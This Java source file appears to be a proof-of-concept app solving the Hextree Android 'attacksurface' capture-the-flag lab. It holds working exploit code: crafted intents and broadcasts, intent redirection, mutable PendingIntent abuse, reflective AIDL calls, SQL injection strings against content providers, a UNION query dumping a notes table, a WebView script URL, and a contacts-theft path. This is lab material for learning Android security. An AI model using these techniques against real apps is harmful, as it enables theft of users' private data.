package com.example.intent_pocapp;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.Messenger;
import android.os.RemoteException;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import io.hextree.attacksurface.services.IFlag29Interface;

import androidx.activity.EdgeToEdge;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class MainActivity extends AppCompatActivity {
    private MyReceiver myReceiver = new MyReceiver();

    ServiceConnection serviceconnectionFlag26 = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            Log.d("Flag26Service: ", "serviceconnectionFlag26 onServiceConnected");
            Messenger serviceMessenger = new Messenger(service);
            Message msg = Message.obtain(null, 42);
            try {
                serviceMessenger.send(msg);//向目标service发送消息
            } catch (RemoteException e) {
                throw new RuntimeException(e);
            }
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {
            Log.d("Flag26Service: ", "serviceconnectionFlag26 onServiceDisconnected");
        }
    };

    String password = new String();
    private class incomingHandler extends Handler {
        incomingHandler(){
            super(Looper.getMainLooper());
        }

        @Override
        public void handleMessage(Message msg) {
            Bundle bundleExtra = msg.getData();
            switch (msg.what) {
                case 2:
                    Log.d("Flag27Service: ", "handleMessage msg.what==2");
                    if(bundleExtra.getString("password")!=null){
                        password = new String(bundleExtra.getString("password"));
                        Log.d("Flag27Service: ", "password: "+password);
                    }
                    break;
                case 3:
                    Log.d("Flag27Service: ", "handleMessage msg.what==3");
                    String reply = bundleExtra.getString("reply");
                    Log.d("Flag27Service: ", "reply: " + reply);
                    break;
                default:
                    super.handleMessage(msg);
            }
        }
    }

    //Flag27service设置echo和获取password
    Messenger replyfromservice = new Messenger(new incomingHandler());
    ServiceConnection serviceconnectionFlag27_setecho_getPassword = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            Log.d("Flag27Service: ", "serviceconnectionFlag27_setecho_getPassword onServiceConnected");
            Messenger serviceMessenger = new Messenger(service);
//            msg.replyTo = replyfromservice;
            try {
                //向目标service发送消息，what==1
                Message msg = Message.obtain(null, 1);
                Bundle bundleExtra = new Bundle();
                bundleExtra.putString("echo","give flag");
                msg.setData(bundleExtra);
                serviceMessenger.send(msg);

                //向目标service发送消息，what==2
                msg = Message.obtain(null, 2);
                Bundle bundleExtra2 = new Bundle();
                bundleExtra2.putString("value","not null");
                msg.obj = bundleExtra2;
                msg.replyTo = replyfromservice;
                msg.setData(bundleExtra2);
                serviceMessenger.send(msg);

            } catch (RemoteException e) {
                throw new RuntimeException(e);
            }
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {
            Log.d("Flag27Service: ", "serviceconnectionFlag27_setecho_getPassword onServiceDisconnected");
        }
    };

    //最终触发Flag27service的success()方法
    ServiceConnection serviceconnectionFlag27_accessSuccess = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            Log.d("Flag27Service: ", "serviceconnectionFlag27_accessSuccess onServiceConnected");
            Messenger serviceMessenger = new Messenger(service);
            Message msg = Message.obtain(null, 3);
            Bundle bundleExtra = new Bundle();
//            if (password!=null)
//                Log.d("Flag27Service check", password.toString());
//            else
//                Toast.makeText(MainActivity.this,"password is null",Toast.LENGTH_LONG).show();
            bundleExtra.putString("password",password.toString());
            bundleExtra.putString("echo","give flag");
            msg.replyTo = replyfromservice;
            msg.setData(bundleExtra);
            try {
                serviceMessenger.send(msg);//向目标service发送消息
            } catch (RemoteException e) {
                throw new RuntimeException(e);
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            Log.d("Flag27Service: ", "serviceconnectionFlag27_accessSuccess onServiceDisconnected");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        String hello = "222";

        //solve Flag17Receiver
        Intent intent17 = new Intent("io.hextree.broadcast.MALICIOUS");
        intent17.putExtra("flag", "give-flag-17");
//        ComponentName componentName = new ComponentName("io.hextree.attacksurface","io.hextree.attacksurface.receivers.Flag17Receiver");
        //Flag17Receiver是静态注册的，没法响应我发送的广播，因此通过setClassName()显示指定目标类名
        intent17.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag17Receiver");
        sendOrderedBroadcast(intent17, null, new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                Log.d("Flag17Receiver: ", "广播已发送");
                Bundle resultExtra = getResultExtras(false);
                Log.d("Flag17Receiver: ", resultExtra.getString("flag"));
            }
        }, null, 0, null, null);

        Button btn1 = findViewById(R.id.btn1);
        btn1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag1Activity"));
                startActivity(intent);
            }
        });

        Button btn2 = findViewById(R.id.btn2);
        btn2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent("io.hextree.action.GIVE_FLAG");
                //intent.setComponent(new ComponentName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag2Activity"));
                startActivity(intent);
            }
        });

        Button btn3 = findViewById(R.id.btn3);
        btn3.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent("io.hextree.action.GIVE_FLAG");
                Uri uri = Uri.parse("https://app.hextree.io/map/android");
                intent.setData(uri);
                //intent.setComponent(new ComponentName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag3Activity"));
                startActivity(intent);
            }
        });

        Button btn4 = findViewById(R.id.btn4);
        btn4.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent("GET_FLAG_ACTION");
                intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag4Activity"));
//                Utils.showDialog(this,intent);
//                intent.putExtra("Flag4Activity",3);
                startActivity(intent);

            }
        });


        Button btn5 = findViewById(R.id.btn5);
        btn5.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity"));

                Intent intent2 = new Intent();
                intent.putExtra("android.intent.extra.INTENT", intent2);
                intent2.putExtra("return", 42);

                Intent intent3 = new Intent();
                //为了通过Flag5Activity触发Flag6Activity
                intent3.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag6Activity"));
                //为了通过Flag5Activity触发Flag6Activity，设置reason为next
                intent3.putExtra("reason", "next");
                //为了通过Flag5Activity触发Flag6Activity，设置Flag为FLAG_GRANT_READ_URI_PERMISSION
                intent3.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                intent2.putExtra("nextIntent", intent3);

                startActivity(intent);

            }
        });

        Button btn6 = findViewById(R.id.btn6);
        btn6.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                //code here


            }
        });

        Button btn7 = findViewById(R.id.btn7);
        btn7.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent("REOPEN");
//                intent.putExtra("hideIntent", true);
                intent.setFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
                intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity"));
                startActivity(intent);

            }
        });

        //solve Flag8Activity
        Intent intent = new Intent(this, HextreeActivity.class);
//        intent.addFlags(Intent.FLAG_DEBUG_LOG_RESOLUTION)
//        intent.setComponent(new ComponentName("com.example.intent_pocapp","com.example.intent_pocapp.SecondActivity"));
        Button btn_HextreeActivity = findViewById(R.id.btn_HextreeActivity);
        btn_HextreeActivity.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startActivity(intent);
            }
        });

        //solve Flag13Activity
        Button btn13 = findViewById(R.id.btn13);
        btn13.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag13Activity"));
                intent.setAction(Intent.ACTION_VIEW);
                intent.addCategory(Intent.CATEGORY_BROWSABLE);
                intent.addCategory(Intent.CATEGORY_DEFAULT);
                intent.putExtra("com.android.browser.application_id", "not null");
                Uri data = Uri.parse("hex://flag?action=give-me");
                data.getHost();
                data.getQueryParameter("action");
                intent.setData(data);

                startActivity(intent);
            }
        });

        //solve Flag15Activity : btn15->https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/->Flag15Activity
        Button btn15 = findViewById(R.id.btn15);
        btn15.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                StringBuilder sb = new StringBuilder();
//                intent://scan/#Intent;scheme=zxing;package=com.google.zxing.client.android;end
                sb.append("intent:#Intent;");
                sb.append("action=io.hextree.action.GIVE_FLAG;");
                sb.append("category=android.intent.category.BROWSABLE;");
                sb.append("S.com.android.browser.application_id=1;");
                sb.append("S.action=flag;");
                sb.append("B.flag=true;end");


                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setData(Uri.parse("https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-link-builder?href=" + Uri.encode(sb.toString())));

                startActivity(intent);
            }
        });


        //solve Flag16Receiver
        Intent trigger_Flag16Receiver = new Intent();
        trigger_Flag16Receiver.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag16Receiver"));

        trigger_Flag16Receiver.putExtra("flag", "give-flag-16");

        Button btn16 = findViewById(R.id.btn16);
        btn16.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                sendBroadcast(trigger_Flag16Receiver);
            }
        });

        //solve Flag22Activity
        Intent response_Flag22 = new Intent();
        response_Flag22.setComponent(new ComponentName("com.example.intent_pocapp", "com.example.intent_pocapp.ResponseFlag22Activity"));
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, response_Flag22, PendingIntent.FLAG_MUTABLE);
        Button btn22 = findViewById(R.id.btn22);
        btn22.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent startFlag22Activity = new Intent();
                startFlag22Activity.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag22Activity"));
                startFlag22Activity.putExtra("PENDING", pendingIntent);
                startActivity(startFlag22Activity);
            }
        });


//        isOrderedBroadcast()

        //solve Flag18Activity
        /*
           target api >26 广播接收器无法通过静态注册响应隐式广播（其实就是隐式intent）
           所以这里使用动态广播注册
         */
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction("io.hextree.broadcast.FREE_FLAG");
//        ComponentName componentName = new ComponentName(this, MyBroadcastReceiver.class);
        registerReceiver(myReceiver, intentFilter,RECEIVER_EXPORTED);

        //solve Flag19Widget
        Intent intent19 = new Intent("io.hextree.attacksurface.APPWIDGET_UPDATE");
        intent19.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag19Widget"));

        Bundle bundleExtra = new Bundle();
        intent19.putExtra("appWidgetOptions", bundleExtra);
        bundleExtra.putInt("appWidgetMaxHeight", 1094795585);
        bundleExtra.putInt("appWidgetMinHeight", 322376503);
        Button btn19 = findViewById(R.id.btn19);
        btn19.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                sendBroadcast(intent19);
            }
        });

        //solve Flag20Activity
        Intent intent20 = new Intent();
        intent20.setAction("io.hextree.broadcast.GET_FLAG");//设置广播
        intent20.putExtra("give-flag", true);//满足flag20receiver执行success()的条件
        Button btn20 = findViewById(R.id.btn20);
        btn20.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                sendBroadcast(intent20);
            }
        });

        //solve Flag21Activity
        BroadcastReceiver broadcastReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                String flag = intent.getStringExtra("flag");
                Log.d("Flag21Activity: ", flag);
            }
        };
        IntentFilter intentFilter21 = new IntentFilter();
        intentFilter21.addAction("io.hextree.broadcast.GIVE_FLAG");
        registerReceiver(broadcastReceiver, intentFilter21,RECEIVER_EXPORTED);

        //solve Flag24Service
        Button btn24 = findViewById(R.id.btn24);
        Intent intent24 = new Intent();
        intent24.setAction("io.hextree.services.START_FLAG24_SERVICE");
        intent24.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag24Service");
        btn24.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startService(intent24);
            }
        });

        //solve Flag25Service
        Button btn25 = findViewById(R.id.btn25);
        Intent unlock1Intent = new Intent();
        unlock1Intent.setAction("io.hextree.services.UNLOCK1");
        unlock1Intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag25Service");
        Intent unlock2Intent = new Intent();
        unlock2Intent.setAction("io.hextree.services.UNLOCK2");
        unlock2Intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag25Service");
        Intent unlock3Intent = new Intent();
        unlock3Intent.setAction("io.hextree.services.UNLOCK3");
        unlock3Intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag25Service");
        btn25.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startService(unlock1Intent);
                startService(unlock2Intent);
                startService(unlock3Intent);
            }
        });


        //solve Flag26Service
        Button btn26 = findViewById(R.id.btn26);
        btn26.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent();
//                intent.setAction("io.hextree.services.START_FLAG26_SERVICE");
                intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag26Service");
                bindService(intent, serviceconnectionFlag26, Context.BIND_AUTO_CREATE);
            }
        });

        //solve Flag27Service
        Button btn27 = findViewById(R.id.btn27);
        btn27.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface",
                        "io.hextree.attacksurface.services.Flag27Service");
                bindService(intent, serviceconnectionFlag27_setecho_getPassword, Context.BIND_AUTO_CREATE);
            }
        });

        Button btn27_assist = findViewById(R.id.btn27_assist);
        btn27_assist.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface",
                        "io.hextree.attacksurface.services.Flag27Service");
                bindService(intent, serviceconnectionFlag27_accessSuccess, Context.BIND_AUTO_CREATE);
            }
        });

        //solve Flag28Service
        ServiceConnection serviceconnectionFlag28 = new ServiceConnection() {
            @Override
            public void onServiceConnected(ComponentName name, IBinder service) {
//                IFlag28Interface iFlag28interface = IFlag28Interface.Stub.asInterface(service);
//                try {
//                    iFlag28interface.openFlag();
//                } catch (RemoteException e) {
//                    e.printStackTrace();
//                }

                // Load the class dynamically
                ClassLoader classLoader = null;
                try {
                    classLoader = MainActivity.this.createPackageContext(
                            "io.hextree.attacksurface",
                            Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY).getClassLoader();
                } catch (PackageManager.NameNotFoundException e) {
                    throw new RuntimeException(e);
                }
                Class<?> iRemoteServiceClass = null;
                try {
                    iRemoteServiceClass = classLoader.loadClass("io.hextree.attacksurface.services.IFlag28Interface");
                } catch (ClassNotFoundException e) {
                    throw new RuntimeException(e);
                }
                Class<?> stubClass = null;
                for(Class<?> innerClass : iRemoteServiceClass.getDeclaredClasses()) {
                    if (innerClass.getSimpleName().equals("Stub")) {
                        stubClass = innerClass;
                        break;
                    }
                }


                // Get the asInterface method
                Method asInterfaceMethod = null;
                try {
                    asInterfaceMethod = stubClass.getDeclaredMethod("asInterface", IBinder.class);
                } catch (NoSuchMethodException e) {
                    throw new RuntimeException(e);
                }
                // Invoke the asInterface method to get the instance of IRemoteService
                Object iRemoteService = null;
                try {
                    iRemoteService = asInterfaceMethod.invoke(null, service);
                } catch (IllegalAccessException e) {
                    throw new RuntimeException(e);
                } catch (InvocationTargetException e) {
                    throw new RuntimeException(e);
                }
                // Call the init method and get the returned string
                Method openFlagMethod = null;
                try {
                    openFlagMethod = iRemoteService.getClass().getDeclaredMethod("openFlag");
                } catch (NoSuchMethodException e) {
                    throw new RuntimeException(e);
                }
                try {
                    boolean Result = (boolean) openFlagMethod.invoke(iRemoteService);
                } catch (IllegalAccessException e) {
                    throw new RuntimeException(e);
                } catch (InvocationTargetException e) {
                    throw new RuntimeException(e);
                }
            }

            @Override
            public void onServiceDisconnected(ComponentName name) {
            }
        };

        Button btn28 = findViewById(R.id.btn28);
        btn28.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface",
                        "io.hextree.attacksurface.services.Flag28Service");

                bindService(intent, serviceconnectionFlag28, Context.BIND_AUTO_CREATE);
            }
        });

        //solve Flag29Service
        ServiceConnection serviceconnectionFlag29 = new ServiceConnection() {
            @Override
            public void onServiceConnected(ComponentName name, IBinder service) {
                IFlag29Interface iFlag29interface = IFlag29Interface.Stub.asInterface(service);
                Log.d("Flag29Service: ", "onServiceConnected");
                try {
                    String pw = iFlag29interface.init();
                    iFlag29interface.authenticate(pw);
                    iFlag29interface.success();
                } catch (RemoteException e) {
                    e.printStackTrace();
                }
            }

            @Override
            public void onServiceDisconnected(ComponentName name) {
            }
        };

        Button btn29 = findViewById(R.id.btn29);
        btn29.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface",
                        "io.hextree.attacksurface.services.Flag29Service");
                bindService(intent, serviceconnectionFlag29, Context.BIND_AUTO_CREATE);
            }
        });

        Button btn30 = findViewById(R.id.btn30);
        btn30.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Cursor cursor = getContentResolver().query(Uri.parse("content://io.hextree.flag30/success")
                        ,null,null,
                        null,null);

                // dump Uri
                dumpUri(cursor);

            }
        });

        Button btn31 = findViewById(R.id.btn31);
        btn31.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                getContentResolver().query(Uri.parse("content://io.hextree.flag31/flag/31")
                        ,null,null,
                        null,null);
            }
        });

        Button btn32 = findViewById(R.id.btn32);
        btn32.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Cursor cursor = getContentResolver().query(Uri.parse("content://io.hextree.flag32/flags")
                        ,null,"1=1) OR name='flag32' -- ",
                        null,null);

                dumpUri(cursor);
            }
        });

        //solve Flag33_1
        /*
        <provider
            android:name="io.hextree.attacksurface.providers.Flag33Provider1"
            android:enabled="true"
            android:exported="false"
            android:authorities="io.hextree.flag33_1"
            android:grantUriPermissions="true"/>

         */
        Button btn33 = findViewById(R.id.btn33);
        btn33.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent();
                //intent.putExtra("secret","secret value");
                intent.setAction("io.hextree.FLAG33");
                intent.setComponent(new ComponentName("io.hextree.attacksurface",
                        "io.hextree.attacksurface.activities.Flag33Activity1"));
                startActivityForResult(intent,1);
            }
        });

        /*
        利用Flag8Activity获取联系人列表
         */

        Button btn_forGetContacts = findViewById(R.id.btn_forGetContacts);
        btn_forGetContacts.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent2 = new Intent(MainActivity.this, exploitFlag8ForContacts.class);
                startActivity(intent2);
            }
        });

        Button btn38 = findViewById(R.id.btn38);
        btn38.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface",
                        "io.hextree.attacksurface.webviews.Flag38WebViewsActivity");
                intent.putExtra("URL","data:text/html,<script>hextree.success(true)</script>");
                startActivity(intent);
            }
        });
    }


    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
       if(requestCode == 1 && resultCode == -1){
//            Toast.makeText(this, "get into onActivityResult", Toast.LENGTH_SHORT).show();
            Cursor cursor = getContentResolver().query(data.getData(),
                    null,"1=1 UNION SELECT _id, title, content, 0 FROM note",
                    null,null);

            dumpUri(cursor);
        }
    }


    static void dumpUri(Cursor cursor){
        if (cursor!=null && cursor.moveToFirst()) {
            do {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < cursor.getColumnCount(); i++) {
                    if (sb.length() > 0) {
                        sb.append(", ");
                    }
                    sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                }
                Log.d("evil", sb.toString());
            } while (cursor.moveToNext());
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        unregisterReceiver(myReceiver);
    }
}